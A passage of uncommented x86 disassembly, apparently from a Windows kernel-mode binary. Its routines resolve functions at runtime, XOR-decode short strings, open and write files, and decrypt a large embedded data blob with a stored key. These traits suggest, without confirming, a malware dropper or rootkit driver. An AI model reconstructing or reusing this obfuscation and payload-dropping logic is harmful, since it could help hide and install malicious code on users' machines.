   17819:	call   eax
   1781b:	test   eax,eax
   1781d:	jge    0x17822
   1781f:	mov    DWORD PTR [ebp+0xc],ebx
   17822:	cmp    DWORD PTR [ebp+0xc],ebx
   17825:	je     0x17839
   17827:	lea    eax,[ebp-0x30]
   1782a:	push   eax
   1782b:	push   DWORD PTR [ebp+0xc]
   1782e:	call   0x173aa
   17833:	push   ebx
   17834:	call   0x10f26
   17839:	cmp    BYTE PTR [ebp-0x1],bl
   1783c:	je     0x178a7
   1783e:	mov    esi,DWORD PTR [ebp-0x1c]
   17841:	cmp    esi,ebx
   17843:	je     0x178a7
   17845:	cmp    BYTE PTR [ebp-0xc],bl
   17848:	jne    0x178a7
   1784a:	push   0x6
   1784c:	pop    ecx
   1784d:	push   ebx
   1784e:	xor    eax,eax
   17850:	mov    DWORD PTR [ebp-0x4c],ebx
   17853:	lea    edi,[ebp-0x48]
   17856:	push   0x1c
   17858:	rep stos DWORD PTR es:[edi],eax
   1785a:	lea    eax,[ebp-0x4c]
   1785d:	push   eax
   1785e:	push   ebx
   1785f:	push   DWORD PTR [ebp+0x8]
   17862:	call   0x1192c
   17867:	call   eax
   17869:	cmp    DWORD PTR [ebp-0x44],esi
   1786c:	jne    0x178a7
   1786e:	push   ebx
   1786f:	push   0x4
   17871:	lea    eax,[ebp+0xc]
   17874:	push   eax
   17875:	push   0x9
   17877:	push   DWORD PTR [ebp+0x8]
   1787a:	mov    DWORD PTR [ebp+0xc],ebx
   1787d:	call   0x1192c
   17882:	call   eax
   17884:	test   eax,eax
   17886:	jge    0x1788b
   17888:	mov    DWORD PTR [ebp+0xc],ebx
   1788b:	cmp    DWORD PTR [ebp+0xc],ebx
   1788e:	je     0x178a7
   17890:	lea    eax,[ebp-0x1c]
   17893:	push   eax
   17894:	push   DWORD PTR [ebp+0xc]
   17897:	call   0x12500
   1789c:	lea    eax,[ebp-0x1c]
   1789f:	push   eax
   178a0:	push   0x1
   178a2:	call   0x10ede
   178a7:	mov    eax,DWORD PTR [ebp-0x8]
   178aa:	pop    edi
   178ab:	pop    esi
   178ac:	pop    ebx
   178ad:	leave  
   178ae:	ret    0x8
   178b1:	int3   
   178b2:	int3   
   178b3:	int3   
   178b4:	int3   
   178b5:	int3   
   178b6:	push   0x24
   178b8:	push   0x7e1a8
   178bd:	call   0x1daf8
   178c2:	xor    ebx,ebx
   178c4:	push   ebx
   178c5:	push   ebx
   178c6:	push   ebx
   178c7:	push   ebx
   178c8:	push   0x7e560
   178cd:	call   DWORD PTR ds:0x1f028
   178d3:	cmp    eax,ebx
   178d5:	jge    0x178e6
   178d7:	mov    eax,DWORD PTR [ebp+0x8]
   178da:	mov    DWORD PTR [eax+0x8],0x4
   178e1:	jmp    0x1799e
   178e6:	mov    DWORD PTR [ebp-0x4],ebx
   178e9:	push   0xffffffff
   178eb:	mov    esi,DWORD PTR [ebp+0x8]
   178ee:	lea    eax,[esi+0xc]
   178f1:	push   eax
   178f2:	lea    ecx,[ebp-0x24]
   178f5:	call   0x129ba
   178fa:	push   0xffffffff
   178fc:	mov    eax,DWORD PTR [ebp-0x20]
   178ff:	lea    eax,[eax+esi*1+0xd]
   17903:	push   eax
   17904:	lea    ecx,[ebp-0x2c]
   17907:	call   0x129ba
   1790c:	push   0xffffffff
   1790e:	push   0x1df10
   17913:	lea    ecx,[ebp-0x34]
   17916:	call   0x110b8
   1791b:	lea    eax,[ebp-0x34]
   1791e:	push   eax
   1791f:	lea    eax,[ebp-0x2c]
   17922:	push   eax
   17923:	call   0x19804
   17928:	mov    BYTE PTR [ebp-0x19],al
   1792b:	push   DWORD PTR [ebp-0x34]
   1792e:	call   0x10a86
   17933:	pop    ecx
   17934:	lea    eax,[ebp-0x24]
   17937:	mov    ecx,DWORD PTR ds:0x7e530
   1793d:	push   eax
   1793e:	cmp    BYTE PTR [ebp-0x19],bl
   17941:	je     0x1794a
   17943:	call   0x161c2
   17948:	jmp    0x1795a
   1794a:	call   0x16f0a
   1794f:	lea    ecx,[ebp-0x2c]
   17952:	push   ecx
   17953:	mov    ecx,eax
   17955:	call   0x129fc
   1795a:	mov    DWORD PTR [esi+0x8],ebx
   1795d:	push   DWORD PTR [ebp-0x2c]
   17960:	call   0x10a86
   17965:	push   DWORD PTR [ebp-0x24]
   17968:	call   0x10a86
   1796d:	pop    ecx
   1796e:	pop    ecx
   1796f:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   17976:	jmp    0x17992
   17978:	xor    eax,eax
   1797a:	inc    eax
   1797b:	ret    
   1797c:	mov    esp,DWORD PTR [ebp-0x18]
   1797f:	mov    eax,DWORD PTR [ebp+0x8]
   17982:	mov    DWORD PTR [eax+0x8],0x4
   17989:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   17990:	xor    ebx,ebx
   17992:	push   ebx
   17993:	push   0x7e560
   17998:	call   DWORD PTR ds:0x1f024
   1799e:	call   0x1db3d
   179a3:	ret    0x4
   179a6:	int3   
   179a7:	int3   
   179a8:	int3   
   179a9:	int3   
   179aa:	int3   
   179ab:	int3   
   179ac:	push   0xc
   179ae:	push   0x7e1c8
   179b3:	call   0x1daf8
   179b8:	xor    edi,edi
   179ba:	push   edi
   179bb:	push   edi
   179bc:	push   edi
   179bd:	push   edi
   179be:	push   0x7e560
   179c3:	call   DWORD PTR ds:0x1f028
   179c9:	cmp    eax,edi
   179cb:	jge    0x179d9
   179cd:	mov    eax,DWORD PTR [ebp+0x8]
   179d0:	mov    DWORD PTR [eax+0x8],0x4
   179d7:	jmp    0x17a4f
   179d9:	mov    DWORD PTR [ebp-0x4],edi
   179dc:	mov    esi,DWORD PTR [ebp+0x8]
   179df:	lea    eax,[esi+0x4]
   179e2:	mov    ecx,DWORD PTR ds:0x7e5bc
   179e8:	push   eax
   179e9:	cmp    DWORD PTR [esi],edi
   179eb:	jbe    0x17a18
   179ed:	call   0x16f7a
   179f2:	mov    ebx,eax
   179f4:	push   DWORD PTR [esi]
   179f6:	lea    eax,[esi+0xc]
   179f9:	push   eax
   179fa:	lea    ecx,[ebp-0x1c]
   179fd:	call   0x137ce
   17a02:	push   eax
   17a03:	mov    ecx,ebx
   17a05:	call   0x11f56
   17a0a:	mov    ecx,DWORD PTR [ebp-0x1c]
   17a0d:	cmp    ecx,edi
   17a0f:	je     0x17a1d
   17a11:	call   0x10aa4
   17a16:	jmp    0x17a1d
   17a18:	call   0x16bac
   17a1d:	mov    DWORD PTR [esi+0x8],edi
   17a20:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   17a27:	jmp    0x17a43
   17a29:	xor    eax,eax
   17a2b:	inc    eax
   17a2c:	ret    
   17a2d:	mov    esp,DWORD PTR [ebp-0x18]
   17a30:	mov    eax,DWORD PTR [ebp+0x8]
   17a33:	mov    DWORD PTR [eax+0x8],0x4
   17a3a:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   17a41:	xor    edi,edi
   17a43:	push   edi
   17a44:	push   0x7e560
   17a49:	call   DWORD PTR ds:0x1f024
   17a4f:	call   0x1db3d
   17a54:	ret    0x4
   17a57:	int3   
   17a58:	int3   
   17a59:	int3   
   17a5a:	int3   
   17a5b:	int3   
   17a5c:	mov    edi,edi
   17a5e:	push   ebp
   17a5f:	mov    ebp,esp
   17a61:	sub    esp,0x10
   17a64:	and    DWORD PTR [ebp-0xc],0x0
   17a68:	xor    ecx,ecx
   17a6a:	mov    DWORD PTR [ebp-0x10],0x1
   17a71:	xor    eax,eax
   17a73:	mov    dl,BYTE PTR [eax+0x7a52c]
   17a79:	xor    BYTE PTR [ebp+ecx*1-0x10],dl
   17a7d:	inc    ecx
   17a7e:	inc    eax
   17a7f:	and    eax,0xf
   17a82:	cmp    ecx,0x8
   17a85:	jne    0x17a73
   17a87:	push   ecx
   17a88:	lea    eax,[ebp-0x10]
   17a8b:	push   eax
   17a8c:	lea    ecx,[ebp-0x8]
   17a8f:	mov    DWORD PTR [ebp-0x4],0x2
   17a96:	call   0x137ce
   17a9b:	mov    ecx,DWORD PTR ds:0x7e5bc
   17aa1:	push   eax
   17aa2:	lea    eax,[ebp-0x4]
   17aa5:	push   eax
   17aa6:	call   0x16f7a
   17aab:	mov    ecx,eax
   17aad:	call   0x11f56
   17ab2:	mov    ecx,DWORD PTR [ebp-0x8]
   17ab5:	test   ecx,ecx
   17ab7:	je     0x17abe
   17ab9:	call   0x10aa4
   17abe:	leave  
   17abf:	ret    
   17ac0:	int3   
   17ac1:	int3   
   17ac2:	int3   
   17ac3:	int3   
   17ac4:	int3   
   17ac5:	int3   
   17ac6:	push   0x848
   17acb:	push   0x7e1e8
   17ad0:	call   0x1de00
   17ad5:	xor    ebx,ebx
   17ad7:	mov    BYTE PTR [ebp-0x81d],bl
   17add:	xor    eax,eax
   17adf:	mov    WORD PTR [ebp-0x81c],ax
   17ae6:	push   0x7fe
   17aeb:	push   ebx
   17aec:	lea    eax,[ebp-0x81a]
   17af2:	push   eax
   17af3:	call   0x1daba
   17af8:	add    esp,0xc
   17afb:	push   0x1e832
   17b00:	push   0x15
   17b02:	push   0x1e806
   17b07:	call   0x16cb0
   17b0c:	mov    edx,eax
   17b0e:	mov    cx,WORD PTR [eax]
   17b11:	inc    eax
   17b12:	inc    eax
   17b13:	cmp    cx,bx
   17b16:	jne    0x17b0e
   17b18:	sub    eax,edx
   17b1a:	lea    edi,[ebp-0x81c]
   17b20:	dec    edi
   17b21:	dec    edi
   17b22:	mov    cx,WORD PTR [edi+0x2]
   17b26:	inc    edi
   17b27:	inc    edi
   17b28:	cmp    cx,bx
   17b2b:	jne    0x17b22
   17b2d:	mov    ecx,eax
   17b2f:	mov    esi,edx
   17b31:	shr    ecx,0x2
   17b34:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   17b36:	mov    ecx,eax
   17b38:	and    ecx,0x3
   17b3b:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   17b3d:	mov    eax,0x7e408
   17b42:	mov    edx,eax
   17b44:	mov    cx,WORD PTR [eax]
   17b47:	inc    eax
   17b48:	inc    eax
   17b49:	cmp    cx,bx
   17b4c:	jne    0x17b44
   17b4e:	sub    eax,edx
   17b50:	lea    edi,[ebp-0x81c]
   17b56:	dec    edi
   17b57:	dec    edi
   17b58:	mov    cx,WORD PTR [edi+0x2]
   17b5c:	inc    edi
   17b5d:	inc    edi
   17b5e:	cmp    cx,bx
   17b61:	jne    0x17b58
   17b63:	mov    ecx,eax
   17b65:	mov    esi,edx
   17b67:	shr    ecx,0x2
   17b6a:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   17b6c:	mov    ecx,eax
   17b6e:	and    ecx,0x3
   17b71:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   17b73:	push   0x1e7ce
   17b78:	push   0x4
   17b7a:	push   0x1e5ca
   17b7f:	call   0x16cb0
   17b84:	mov    edx,eax
   17b86:	mov    cx,WORD PTR [eax]
   17b89:	inc    eax
   17b8a:	inc    eax
   17b8b:	cmp    cx,bx
   17b8e:	jne    0x17b86
   17b90:	sub    eax,edx
   17b92:	lea    edi,[ebp-0x81c]
   17b98:	dec    edi
   17b99:	dec    edi
   17b9a:	mov    cx,WORD PTR [edi+0x2]
   17b9e:	inc    edi
   17b9f:	inc    edi
   17ba0:	cmp    cx,bx
   17ba3:	jne    0x17b9a
   17ba5:	mov    ecx,eax
   17ba7:	mov    esi,edx
   17ba9:	shr    ecx,0x2
   17bac:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   17bae:	mov    ecx,eax
   17bb0:	and    ecx,0x3
   17bb3:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   17bb5:	lea    eax,[ebp-0x81c]
   17bbb:	push   eax
   17bbc:	lea    eax,[ebp-0x858]
   17bc2:	push   eax
   17bc3:	call   0x11c9e
   17bc8:	call   eax
   17bca:	mov    DWORD PTR [ebp-0x824],ebx
   17bd0:	xor    eax,eax
   17bd2:	lea    edi,[ebp-0x84c]
   17bd8:	stos   DWORD PTR es:[edi],eax
   17bd9:	stos   DWORD PTR es:[edi],eax
   17bda:	stos   DWORD PTR es:[edi],eax
   17bdb:	stos   DWORD PTR es:[edi],eax
   17bdc:	stos   DWORD PTR es:[edi],eax
   17bdd:	mov    DWORD PTR [ebp-0x830],ebx
   17be3:	xor    eax,eax
   17be5:	lea    edi,[ebp-0x82c]
   17beb:	stos   DWORD PTR es:[edi],eax
   17bec:	mov    DWORD PTR [ebp-0x850],0x18
   17bf6:	mov    DWORD PTR [ebp-0x84c],ebx
   17bfc:	mov    DWORD PTR [ebp-0x844],0x240
   17c06:	lea    eax,[ebp-0x858]
   17c0c:	mov    DWORD PTR [ebp-0x848],eax
   17c12:	mov    DWORD PTR [ebp-0x840],ebx
   17c18:	mov    DWORD PTR [ebp-0x83c],ebx
   17c1e:	push   ebx
   17c1f:	push   ebx
   17c20:	push   0x60
   17c22:	push   0x1
   17c24:	push   ebx
   17c25:	push   0x80
   17c2a:	push   ebx
   17c2b:	lea    eax,[ebp-0x830]
   17c31:	push   eax
   17c32:	lea    eax,[ebp-0x850]
   17c38:	push   eax
   17c39:	push   0x100001
   17c3e:	lea    eax,[ebp-0x824]
   17c44:	push   eax
   17c45:	call   0x1185a
   17c4a:	call   eax
   17c4c:	cmp    eax,ebx
   17c4e:	jge    0x17c57
   17c50:	xor    al,al
   17c52:	jmp    0x17ced
   17c57:	mov    DWORD PTR [ebp-0x4],ebx
   17c5a:	mov    esi,DWORD PTR [ebp+0xc]
   17c5d:	mov    eax,0x10000
   17c62:	cmp    esi,eax
   17c64:	jbe    0x17c68
   17c66:	mov    esi,eax
   17c68:	push   esi
   17c69:	call   0x10a52
   17c6e:	pop    ecx
   17c6f:	mov    DWORD PTR [ebp-0x828],eax
   17c75:	mov    DWORD PTR [ebp-0x838],ebx
   17c7b:	xor    eax,eax
   17c7d:	lea    edi,[ebp-0x834]
   17c83:	stos   DWORD PTR es:[edi],eax
   17c84:	push   ebx
   17c85:	lea    eax,[ebp-0x838]
   17c8b:	push   eax
   17c8c:	push   esi
   17c8d:	push   DWORD PTR [ebp-0x828]
   17c93:	lea    eax,[ebp-0x830]
   17c99:	push   eax
   17c9a:	push   ebx
   17c9b:	push   ebx
   17c9c:	push   ebx
   17c9d:	push   DWORD PTR [ebp-0x824]
   17ca3:	call   0x11ad0
   17ca8:	call   eax
   17caa:	cmp    eax,ebx
   17cac:	jl     0x17cd3
   17cae:	mov    ecx,DWORD PTR [ebp-0x82c]
   17cb4:	mov    edi,DWORD PTR [ebp+0x8]
   17cb7:	mov    esi,DWORD PTR [ebp-0x828]
   17cbd:	xor    eax,eax
   17cbf:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   17cc1:	sete   al
   17cc4:	mov    BYTE PTR [ebp-0x81d],al
   17cca:	jmp    0x17cd3
   17ccc:	xor    eax,eax
   17cce:	inc    eax
   17ccf:	ret    
   17cd0:	mov    esp,DWORD PTR [ebp-0x18]
   17cd3:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   17cda:	push   DWORD PTR [ebp-0x824]
   17ce0:	call   0x11956
   17ce5:	call   eax
   17ce7:	mov    al,BYTE PTR [ebp-0x81d]
   17ced:	call   0x1de48
   17cf2:	ret    0x8
   17cf5:	int3   
   17cf6:	int3   
   17cf7:	int3   
   17cf8:	int3   
   17cf9:	int3   
   17cfa:	push   0x874
   17cff:	push   0x7e208
   17d04:	call   0x1de00
   17d09:	mov    eax,DWORD PTR [ebp+0x8]
   17d0c:	mov    DWORD PTR [ebp-0x830],eax
   17d12:	xor    ebx,ebx
   17d14:	mov    BYTE PTR [ebp-0x81d],bl
   17d1a:	xor    eax,eax
   17d1c:	mov    WORD PTR [ebp-0x81c],ax
   17d23:	push   0x7fe
   17d28:	push   ebx
   17d29:	lea    eax,[ebp-0x81a]
   17d2f:	push   eax
   17d30:	call   0x1daba
   17d35:	add    esp,0xc
   17d38:	push   0x1e882
   17d3d:	push   0x15
   17d3f:	push   0x1e806
   17d44:	call   0x16cb0
   17d49:	mov    edx,eax
   17d4b:	mov    cx,WORD PTR [eax]
   17d4e:	inc    eax
   17d4f:	inc    eax
   17d50:	cmp    cx,bx
   17d53:	jne    0x17d4b
   17d55:	sub    eax,edx
   17d57:	lea    edi,[ebp-0x81c]
   17d5d:	dec    edi
   17d5e:	dec    edi
   17d5f:	mov    cx,WORD PTR [edi+0x2]
   17d63:	inc    edi
   17d64:	inc    edi
   17d65:	cmp    cx,bx
   17d68:	jne    0x17d5f
   17d6a:	mov    ecx,eax
   17d6c:	mov    esi,edx
   17d6e:	shr    ecx,0x2
   17d71:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   17d73:	mov    ecx,eax
   17d75:	and    ecx,0x3
   17d78:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   17d7a:	mov    eax,0x7e408
   17d7f:	mov    edx,eax
   17d81:	mov    cx,WORD PTR [eax]
   17d84:	inc    eax
   17d85:	inc    eax
   17d86:	cmp    cx,bx
   17d89:	jne    0x17d81
   17d8b:	sub    eax,edx
   17d8d:	lea    edi,[ebp-0x81c]
   17d93:	dec    edi
   17d94:	dec    edi
   17d95:	mov    cx,WORD PTR [edi+0x2]
   17d99:	inc    edi
   17d9a:	inc    edi
   17d9b:	cmp    cx,bx
   17d9e:	jne    0x17d95
   17da0:	mov    ecx,eax
   17da2:	mov    esi,edx
   17da4:	shr    ecx,0x2
   17da7:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   17da9:	mov    ecx,eax
   17dab:	and    ecx,0x3
   17dae:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   17db0:	push   0x1e856
   17db5:	push   0x4
   17db7:	push   0x1e5ca
   17dbc:	call   0x16cb0
   17dc1:	mov    edx,eax
   17dc3:	mov    cx,WORD PTR [eax]
   17dc6:	inc    eax
   17dc7:	inc    eax
   17dc8:	cmp    cx,bx
   17dcb:	jne    0x17dc3
   17dcd:	sub    eax,edx
   17dcf:	lea    edi,[ebp-0x81c]
   17dd5:	dec    edi
   17dd6:	dec    edi
   17dd7:	mov    cx,WORD PTR [edi+0x2]
   17ddb:	inc    edi
   17ddc:	inc    edi
   17ddd:	cmp    cx,bx
   17de0:	jne    0x17dd7
   17de2:	mov    ecx,eax
   17de4:	mov    esi,edx
   17de6:	shr    ecx,0x2
   17de9:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   17deb:	mov    ecx,eax
   17ded:	and    ecx,0x3
   17df0:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   17df2:	lea    eax,[ebp-0x81c]
   17df8:	push   eax
   17df9:	lea    eax,[ebp-0x884]
   17dff:	push   eax
   17e00:	call   0x11c9e
   17e05:	call   eax
   17e07:	mov    DWORD PTR [ebp-0x824],ebx
   17e0d:	xor    eax,eax
   17e0f:	lea    edi,[ebp-0x850]
   17e15:	stos   DWORD PTR es:[edi],eax
   17e16:	stos   DWORD PTR es:[edi],eax
   17e17:	stos   DWORD PTR es:[edi],eax
   17e18:	stos   DWORD PTR es:[edi],eax
   17e19:	stos   DWORD PTR es:[edi],eax
   17e1a:	mov    DWORD PTR [ebp-0x82c],ebx
   17e20:	xor    eax,eax
   17e22:	lea    edi,[ebp-0x828]
   17e28:	stos   DWORD PTR es:[edi],eax
   17e29:	mov    DWORD PTR [ebp-0x854],0x18
   17e33:	mov    DWORD PTR [ebp-0x850],ebx
   17e39:	mov    DWORD PTR [ebp-0x848],0x240
   17e43:	lea    eax,[ebp-0x884]
   17e49:	mov    DWORD PTR [ebp-0x84c],eax
   17e4f:	mov    DWORD PTR [ebp-0x844],ebx
   17e55:	mov    DWORD PTR [ebp-0x840],ebx
   17e5b:	push   ebx
   17e5c:	push   ebx
   17e5d:	push   0x60
   17e5f:	push   ebx
   17e60:	push   ebx
   17e61:	push   0x80
   17e66:	push   ebx
   17e67:	lea    eax,[ebp-0x82c]
   17e6d:	push   eax
   17e6e:	lea    eax,[ebp-0x854]
   17e74:	push   eax
   17e75:	push   0x100002
   17e7a:	lea    eax,[ebp-0x824]
   17e80:	push   eax
   17e81:	call   0x1185a
   17e86:	call   eax
   17e88:	cmp    eax,ebx
   17e8a:	jge    0x17e93
   17e8c:	xor    al,al
   17e8e:	jmp    0x17f99
   17e93:	mov    DWORD PTR [ebp-0x4],ebx
   17e96:	xor    eax,eax
   17e98:	lea    edi,[ebp-0x82c]
   17e9e:	stos   DWORD PTR es:[edi],eax
   17e9f:	stos   DWORD PTR es:[edi],eax
   17ea0:	xor    edi,edi
   17ea2:	mov    esi,0x10000
   17ea7:	mov    DWORD PTR [ebp-0x834],edi
   17ead:	mov    eax,DWORD PTR [ebp+0xc]
   17eb0:	cmp    edi,eax
   17eb2:	jae    0x17efd
   17eb4:	mov    DWORD PTR [ebp-0x83c],ebx
   17eba:	mov    DWORD PTR [ebp-0x83c],edi
   17ec0:	mov    DWORD PTR [ebp-0x838],ebx
   17ec6:	sub    eax,edi
   17ec8:	cmp    eax,esi
   17eca:	jb     0x17ece
   17ecc:	mov    eax,esi
   17ece:	push   ebx
   17ecf:	push   ebx
   17ed0:	push   eax
   17ed1:	mov    eax,DWORD PTR [ebp-0x830]
   17ed7:	add    eax,edi
   17ed9:	push   eax
   17eda:	lea    eax,[ebp-0x82c]
   17ee0:	push   eax
   17ee1:	push   ebx
   17ee2:	push   ebx
   17ee3:	push   ebx
   17ee4:	push   DWORD PTR [ebp-0x824]
   17eea:	call   0x11b24
   17eef:	call   eax
   17ef1:	cmp    eax,ebx
   17ef3:	jl     0x17f7f
   17ef9:	add    edi,esi
   17efb:	jmp    0x17ea7
   17efd:	mov    BYTE PTR [ebp-0x81d],0x1
   17f04:	mov    DWORD PTR [ebp-0x87c],ebx
   17f0a:	push   0x9
   17f0c:	pop    ecx
   17f0d:	xor    eax,eax
   17f0f:	lea    edi,[ebp-0x878]
   17f15:	rep stos DWORD PTR es:[edi],eax
   17f17:	mov    eax,DWORD PTR [ebp+0x10]
   17f1a:	mov    DWORD PTR [ebp-0x86c],eax
   17f20:	mov    ecx,DWORD PTR [ebp+0x14]
   17f23:	mov    DWORD PTR [ebp-0x868],ecx
   17f29:	mov    DWORD PTR [ebp-0x874],eax
   17f2f:	mov    DWORD PTR [ebp-0x870],ecx
   17f35:	mov    DWORD PTR [ebp-0x864],eax
   17f3b:	mov    DWORD PTR [ebp-0x860],ecx
   17f41:	mov    DWORD PTR [ebp-0x87c],eax
   17f47:	mov    DWORD PTR [ebp-0x878],ecx
   17f4d:	mov    DWORD PTR [ebp-0x85c],0x80
   17f57:	push   0x4
   17f59:	push   0x28
   17f5b:	lea    eax,[ebp-0x87c]
   17f61:	push   eax
   17f62:	lea    eax,[ebp-0x82c]
   17f68:	push   eax
   17f69:	push   DWORD PTR [ebp-0x824]
   17f6f:	call   0x11afa
   17f74:	call   eax
   17f76:	jmp    0x17f7f
   17f78:	xor    eax,eax
   17f7a:	inc    eax
   17f7b:	ret    
   17f7c:	mov    esp,DWORD PTR [ebp-0x18]
   17f7f:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   17f86:	push   DWORD PTR [ebp-0x824]
   17f8c:	call   0x11956
   17f91:	call   eax
   17f93:	mov    al,BYTE PTR [ebp-0x81d]
   17f99:	call   0x1de48
   17f9e:	ret    0x10
   17fa1:	int3   
   17fa2:	int3   
   17fa3:	int3   
   17fa4:	int3   
   17fa5:	int3   
   17fa6:	push   0x874
   17fab:	push   0x7e228
   17fb0:	call   0x1de00
   17fb5:	xor    ebx,ebx
   17fb7:	mov    BYTE PTR [ebp-0x81d],bl
   17fbd:	mov    BYTE PTR [ebp-0x81e],bl
   17fc3:	mov    DWORD PTR [ebp-0x828],ebx
   17fc9:	mov    DWORD PTR [ebp-0x824],ebx
   17fcf:	xor    eax,eax
   17fd1:	mov    WORD PTR [ebp-0x81c],ax
   17fd8:	push   0x7fe
   17fdd:	push   ebx
   17fde:	lea    eax,[ebp-0x81a]
   17fe4:	push   eax
   17fe5:	call   0x1daba
   17fea:	add    esp,0xc
   17fed:	push   0x1e8e0
   17ff2:	push   0x15
   17ff4:	push   0x1e806
   17ff9:	call   0x16cb0
   17ffe:	mov    edx,eax
   18000:	mov    cx,WORD PTR [eax]
   18003:	inc    eax
   18004:	inc    eax
   18005:	cmp    cx,bx
   18008:	jne    0x18000
   1800a:	sub    eax,edx
   1800c:	lea    edi,[ebp-0x81c]
   18012:	dec    edi
   18013:	dec    edi
   18014:	mov    cx,WORD PTR [edi+0x2]
   18018:	inc    edi
   18019:	inc    edi
   1801a:	cmp    cx,bx
   1801d:	jne    0x18014
   1801f:	mov    ecx,eax
   18021:	mov    esi,edx
   18023:	shr    ecx,0x2
   18026:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   18028:	mov    ecx,eax
   1802a:	and    ecx,0x3
   1802d:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   1802f:	mov    eax,0x7e448
   18034:	mov    edx,eax
   18036:	mov    cx,WORD PTR [eax]
   18039:	inc    eax
   1803a:	inc    eax
   1803b:	cmp    cx,bx
   1803e:	jne    0x18036
   18040:	sub    eax,edx
   18042:	lea    edi,[ebp-0x81c]
   18048:	dec    edi
   18049:	dec    edi
   1804a:	mov    cx,WORD PTR [edi+0x2]
   1804e:	inc    edi
   1804f:	inc    edi
   18050:	cmp    cx,bx
   18053:	jne    0x1804a
   18055:	mov    ecx,eax
   18057:	mov    esi,edx
   18059:	shr    ecx,0x2
   1805c:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1805e:	mov    ecx,eax
   18060:	and    ecx,0x3
   18063:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   18065:	push   0x1e8b0
   1806a:	push   0x4
   1806c:	push   0x1e8a6
   18071:	call   0x16cb0
   18076:	mov    edx,eax
   18078:	mov    cx,WORD PTR [eax]
   1807b:	inc    eax
   1807c:	inc    eax
   1807d:	cmp    cx,bx
   18080:	jne    0x18078
   18082:	sub    eax,edx
   18084:	lea    edi,[ebp-0x81c]
   1808a:	dec    edi
   1808b:	dec    edi
   1808c:	mov    cx,WORD PTR [edi+0x2]
   18090:	inc    edi
   18091:	inc    edi
   18092:	cmp    cx,bx
   18095:	jne    0x1808c
   18097:	mov    ecx,eax
   18099:	mov    esi,edx
   1809b:	shr    ecx,0x2
   1809e:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   180a0:	mov    ecx,eax
   180a2:	and    ecx,0x3
   180a5:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   180a7:	lea    eax,[ebp-0x81c]
   180ad:	push   eax
   180ae:	lea    eax,[ebp-0x85c]
   180b4:	push   eax
   180b5:	call   0x11c9e
   180ba:	call   eax
   180bc:	xor    eax,eax
   180be:	lea    edi,[ebp-0x850]
   180c4:	stos   DWORD PTR es:[edi],eax
   180c5:	stos   DWORD PTR es:[edi],eax
   180c6:	stos   DWORD PTR es:[edi],eax
   180c7:	stos   DWORD PTR es:[edi],eax
   180c8:	stos   DWORD PTR es:[edi],eax
   180c9:	mov    DWORD PTR [ebp-0x834],ebx
   180cf:	xor    eax,eax
   180d1:	lea    edi,[ebp-0x830]
   180d7:	stos   DWORD PTR es:[edi],eax
   180d8:	mov    DWORD PTR [ebp-0x82c],ebx
   180de:	mov    DWORD PTR [ebp-0x854],0x18
   180e8:	mov    DWORD PTR [ebp-0x850],ebx
   180ee:	mov    DWORD PTR [ebp-0x848],0x240
   180f8:	lea    eax,[ebp-0x85c]
   180fe:	mov    DWORD PTR [ebp-0x84c],eax
   18104:	mov    DWORD PTR [ebp-0x844],ebx
   1810a:	mov    DWORD PTR [ebp-0x840],ebx
   18110:	push   ebx
   18111:	push   ebx
   18112:	push   ebx
   18113:	push   0x1
   18115:	push   0x7
   18117:	push   ebx
   18118:	push   ebx
   18119:	lea    eax,[ebp-0x834]
   1811f:	push   eax
   18120:	lea    eax,[ebp-0x854]
   18126:	push   eax
   18127:	push   0x89
   1812c:	lea    eax,[ebp-0x82c]
   18132:	push   eax
   18133:	call   0x1185a
   18138:	call   eax
   1813a:	cmp    eax,ebx
   1813c:	jge    0x18145
   1813e:	xor    al,al
   18140:	jmp    0x18265
   18145:	mov    DWORD PTR [ebp-0x884],ebx
   1814b:	push   0x9
   1814d:	pop    ecx
   1814e:	xor    eax,eax
   18150:	lea    edi,[ebp-0x880]
   18156:	rep stos DWORD PTR es:[edi],eax
   18158:	mov    DWORD PTR [ebp-0x4],ebx
   1815b:	push   0x4
   1815d:	push   0x28
   1815f:	lea    eax,[ebp-0x884]
   18165:	push   eax
   18166:	lea    eax,[ebp-0x834]
   1816c:	push   eax
   1816d:	push   DWORD PTR [ebp-0x82c]
   18173:	call   0x11b4e
   18178:	call   eax
   1817a:	cmp    eax,ebx
   1817c:	jl     0x181fa
   1817e:	mov    esi,0x5b462
   18183:	push   esi
   18184:	call   0x10a52
   18189:	mov    edi,eax
   1818b:	push   esi
   1818c:	push   0x1f0a0
   18191:	push   edi
   18192:	call   0x1dac6
   18197:	add    esp,0x10
   1819a:	push   0x25
   1819c:	push   0x7a504
   181a1:	push   esi
   181a2:	push   edi
   181a3:	call   0x10ac4
   181a8:	lea    eax,[ebp-0x828]
   181ae:	push   eax
   181af:	push   esi
   181b0:	push   edi
   181b1:	lea    eax,[ebp-0x83c]
   181b7:	push   eax
   181b8:	call   0x1a078
   181bd:	mov    BYTE PTR [ebp-0x83c],bl
   181c3:	mov    eax,DWORD PTR [ebp-0x838]
   181c9:	mov    DWORD PTR [ebp-0x824],eax
   181cf:	cmp    eax,ebx
   181d1:	je     0x181ec
   181d3:	push   DWORD PTR [ebp-0x828]
